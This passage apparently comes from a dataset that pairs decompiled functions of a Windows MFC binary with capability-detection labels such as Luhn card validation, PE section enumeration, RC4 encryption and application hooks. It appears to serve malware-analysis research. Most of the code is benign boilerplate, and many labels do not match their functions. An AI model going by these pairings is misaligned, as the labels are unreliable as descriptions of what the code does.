            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443534(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (arg_ch == 0) {\n        puVar3 = 0x455608;\n        do {\n            iVar2 = fcn.00440bd3(*puVar3);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x1c), 0xffffffff);\n                iVar2 = fcn.0043dafc(uVar1);\n                if (0 < iVar2) break;\n            }\n            if (((puVar3[1] ^ *(arg_8h + 0x7c)) & 0xf000) == 0) {\n                fcn.00440bd3(*puVar3);\n            }\n            puVar3 = puVar3 + 2;\n        } while (puVar3 < 0x455628);\n    }\n    fcn.0043e7bb(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 261
    },
    "00444c1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444c1e(void)\n\n{\n    fcn.00444bf8();\n    fcn.00446580(0x444b92);\n    return;\n}\n",
        "token_count": 40
    },
    "00445b63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445b63(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    iVar1 = fcn.00444bc2();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x24) = 1;\n    return;\n}\n",
        "token_count": 200
    },
    "0044636f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044636f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint lpCriticalSection;\n    \n    puVar1 = in_ECX + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((arg_8h < 1) || (in_ECX[3] <= arg_8h)) goto code_r0x00446469;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (iVar2 == 0) {\n        iVar2 = fcn.00445fd8(0x10);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00446297();\n        }\n        *(iVar2 + 8) = 0;\n        *(iVar2 + 0xc) = 0;\n        *(iVar2 + in_ECX[6]) = in_ECX[5];\n        in_ECX[5] = iVar2;\ncode_r0x004463ea:\n        if (*(iVar2 + 0xc) == 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(*(iVar2 + 0xc), in_ECX[3] << 2, 2);\n        }\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n            iVar3 = fcn.00422e2d();\n        }\n        *(iVar2 + 0xc) = iVar3;\n        fcn.00411850(iVar3 + *(iVar2 + 8) * 4, 0, (in_ECX[3] - *(iVar2 + 8)) * 4);\n        *(iVar2 + 8) = in_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, iVar2);\n    }\n    else if ((*(iVar2 + 8) <= arg_8h) && (arg_ch != 0)) goto code_r0x004463ea;\n    if ((*(iVar2 + 0xc) != 0) && (arg_8h < *(iVar2 + 8))) {\n        *(*(iVar2 + 0xc) + arg_8h * 4) = arg_ch;\n    }\ncode_r0x00446469:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return;\n}\n",
        "token_count": 605
    },
    "004467ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004467ff(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.00411031(*(param_1 + 0x50));\n    uVar1 = fcn.00412404(param_2);\n    *(param_1 + 0x50) = uVar1;\n    fcn.00411031(*(param_1 + 100));\n    uVar1 = fcn.00412404(*(param_1 + 0x4c));\n    *(param_1 + 100) = uVar1;\n    return;\n}\n",
        "token_count": 134
    },
    "00446ccb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446ccb(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint phkResult;\n    uint lpName;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    arg_8h_00 = fcn.00412404(arg_8h);\n    if (arg_8h_00 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h_00);\n        puVar2 = iVar1 + arg_8h_00;\n        while (puVar2 != NULL) {\n            *puVar2 = 0;\n            fcn.0041306a(arg_8h_00, puVar2);\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, arg_8h_00, &phkResult);\n            if (iVar1 != 0) break;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(phkResult, 0, &lpName, 0x105);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if (iVar1 == 0) break;\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000000, arg_8h_00);\n            puVar2 = fcn.00412fff(arg_8h_00, 0x5c);\n        }\n        fcn.00411031(arg_8h_00);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 377
    },
    "00446db3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00446db3(int32_t *param_1, uint8_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    if (((-1 < param_3) && (param_3 < *(*param_1 + -0xc))) &&\n       (iVar1 = fcn.00411e20(*param_1 + param_3, param_2),  iVar1 != 0)) {\n        return iVar1 - *param_1;\n    }\n    return -1;\n}\n",
        "token_count": 122
    },
    "00446e4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446e4e(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (arg_ch < iVar2) {\n        uVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n        fcn.00446e34((iVar1 - arg_ch) + iVar2, arg_ch, uVar3);\n    }\n    else {\n        fcn.004019a0();\n    }\n    return arg_8h;\n}\n",
        "token_count": 185
    },
    "00446f13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446f13(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    if (arg_10h < 0) {\n        arg_10h = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (iVar2 < arg_ch + arg_10h) {\n        arg_10h = iVar2 - arg_ch;\n    }\n    if (iVar2 < arg_ch) {\n        arg_10h = 0;\n    }\n    if ((arg_ch == 0) && (arg_10h == iVar2)) {\n        fcn.004019a0();\n    }\n    else {\n        uVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n        fcn.00446e34(iVar1 + arg_ch, arg_10h, uVar3);\n    }\n    return arg_8h;\n}\n",
        "token_count": 273
    },
    "00448788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00448788(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t arg_10h;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalSize;\n    arg_10h = (*_sym.imp.KERNEL32.dll_GlobalSize)(arg_ch);\n    if (arg_8h == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, arg_10h);\n        if (arg_8h == 0) {\n            return 0;\n        }\n    }\n    else {\n        uVar2 = (*pcVar1)(arg_8h);\n        if (uVar2 < arg_10h) {\n            return 0;\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_GlobalLock)(arg_ch);\n    arg_8h_00 = (*pcVar1)(arg_8h);\n    fcn.00411970(arg_8h_00, arg_ch_00, arg_10h);\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n    (*_sym.imp.KERNEL32.dll_GlobalUnlock)(arg_8h);\n    (*pcVar1)(arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 327
    },
    "004499af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004499af(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00449830(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004498de(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.00449994();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 148
    },
    "00449c49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00449c49(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004461ac(0x449abd);\n    while ((*(iVar1 + 4) == 0 &&\n           (iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(&stack0xffffffe0, 0, 0, 0, 0),  iVar2 != 0))) {\n        iVar2 = fcn.0042f190();\n        if (iVar2 == 0) {\n            return false;\n        }\n    }\n    return *(iVar1 + 4) == 0;\n}\n",
        "token_count": 146
    },
    "0044ab41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0044ab41(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.00444bf8();\n    fcn.0044673a(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.00411e20(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.00444bf8();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.0044679d(1);\n    iVar2 = fcn.00444bf8();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x38),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.00444c1e();\n    if (*(iVar2 + 0x3c) != NULL) {\n        iVar4 = (**(**(iVar2 + 0x3c) + 0x138))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0x3c) = 0;\n        }\n    }\n    iVar2 = fcn.00444bc2();\n    iVar4 = fcn.00444bf8();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "00401e90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401e90(uchar *param_1, uchar param_2, uchar param_3, uchar param_4)\n\n{\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    param_1[2] = param_4;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x10) = 1;\n    return;\n}\n",
        "token_count": 103
    },
    "00401ec0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401ec0(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    *(param_1 + 4) = param_2;\n    *(param_1 + 0xc) = param_3;\n    *(param_1 + 8) = param_4;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    return;\n}\n",
        "token_count": 112
    },
    "00422db4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422db4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.00428f87(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 98
    },
    "00426f34": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426f34(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00427251();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "0042703b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042703b(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 105
    },
    "00427d83": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427d83(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.0042eae6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.00427251();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 122
    },
    "00427f1a": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427f1a(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 133
    },
    "0042807c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042807c(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "0042811f": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042811f(int32_t param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    uVar2 = fcn.0042800f(param_2);\n    *param_3 = uVar2;\n    uVar2 = uVar2 % *(param_1 + 8);\n    *param_2 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar3 = *(*(param_1 + 4) + uVar2 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n            if ((puVar3[1] == *param_3) && (cVar1 = fcn.00443cf1(puVar3 + 2, unaff_retaddr),  cVar1 != '\\0')) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 241
    },
    "004281c7": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004281c7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (*(param_1 + 4) != 0) {\n        uVar1 = 0;\n        if (*(param_1 + 8) != 0) {\n            do {\n                for (puVar2 = *(*(param_1 + 4) + uVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    fcn.00401980();\n                }\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < *(param_1 + 8));\n        }\n        fcn.0042eae6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.00427251();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 244
    },
    "0042e579": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e579(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "0042e84a": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e84a(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 127
    },
    "0043392d": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0043392d(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint hWnd;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x1c);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.0043375c(uVar2);\n    if (iVar3 == 0) {\n        fcn.0043304a();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 340
    },
    "004445d4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004445d4(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.0043f671();\n    return param_1;\n}\n",
        "token_count": 145
    },
    "00445541": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00445541(code **param_1)\n\n{\n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.00402490();\n    fcn.00402490();\n    fcn.00402490();\n    fcn.00402490();\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[1] = 0x1;\n    return param_1;\n}\n",
        "token_count": 114
    },
    "00449aee": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t * fcn.00449aee(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00402490();\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0042eabb(0xb8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 1;\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00423e55(0, 0x40004, 0);\n    }\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = iVar2;\n    *(*(iVar2 + 0x70) + 0x1c) = 1;\n    *(*(*extraout_ECX + 0x70) + 0x1e) = 0xffff;\n    extraout_ECX[0xd] = -1;\n    extraout_ECX[8] = 0;\n    extraout_ECX[2] = 0;\n    extraout_ECX[3] = 0;\n    extraout_ECX[1] = 0;\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    extraout_ECX[5] = 1;\n    extraout_ECX[4] = 1;\n    *in_FS_OFFSET = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 470
    },
    "0040fb14": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fb14(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.0040fab4(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "004340b2": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.004340b2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x3c) = vtable.CDC.0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x4c) = vtable.CDC.0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CBitmap.0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    *(unaff_EBP + -4) = 2;\n    uVar2 = (*pcVar1)(0x14);\n    fcn.00433fce(uVar2);\n    *(unaff_EBP + -4) = 3;\n    uVar2 = (*pcVar1)(0x10);\n    fcn.00433fce(uVar2);\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.0043375c(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.0043375c(uVar2);\n        if (iVar3 != 0) {\n            iVar3 = *(unaff_EBP + 8);\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(iVar3 + 4), 0x18, unaff_EBP + -100);\n            fcn.00433ab0();\n            uVar2 = *(unaff_EBP + -0x60);\n            iVar4 = fcn.0040a8de(uVar2, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x54), *(unaff_EBP + -0x52), 0);\n            if (iVar4 != 0) {\n                uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(*(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), 1, 1, 0);\n                iVar4 = fcn.00433a59();\n                if (iVar4 != 0) {\n                    uVar2 = fcn.00433b14(*(unaff_EBP + -0x38), *(iVar3 + 4));\n                    *(unaff_EBP + 8) = uVar2;\n                    uVar2 = *(unaff_EBP + -0x48);\n                    iVar3 = fcn.00433b14(uVar2, *(unaff_EBP + -0x18));\n                    *(unaff_EBP + -0x14) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x38), 0, 0);\n                        uVar2 = fcn.00432b4c(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        *(unaff_EBP + -0x10) = uVar2;\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0xcc0020);\n                        fcn.00432b4c(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0x1100a6);\n                        if (*(unaff_EBP + 0xc) == 0) {\n                            uVar2 = 0;\n                        }\n                        else {\n                            uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                        }\n                        iVar3 = fcn.00433b14(*(unaff_EBP + -0x38), uVar2);\n                        if (iVar3 != 0) {\n                            fcn.0043f481(0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), *(unaff_EBP + 0x10));\n                            fcn.00432b4c(0xffffff);\n                            uVar2 = fcn.00433bad(unaff_EBP + -0x2c);\n                            *(unaff_EBP + 0xc) = uVar2;\n                            (*pcVar1)(*(unaff_EBP + -0x38), 1, 1, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.00433bad(unaff_EBP + -0x24);\n                            (*pcVar1)(*(unaff_EBP + -0x38), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.00433bad(*(unaff_EBP + 0xc));\n                            fcn.00432b4c(*(unaff_EBP + -0x10));\n                        }\n                        fcn.00433b14(*(unaff_EBP + -0x48), *(*(unaff_EBP + -0x14) + 4));\n                        uVar2 = *(*(unaff_EBP + 8) + 4);\n                        fcn.00433b14(*(unaff_EBP + -0x38), uVar2);\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + 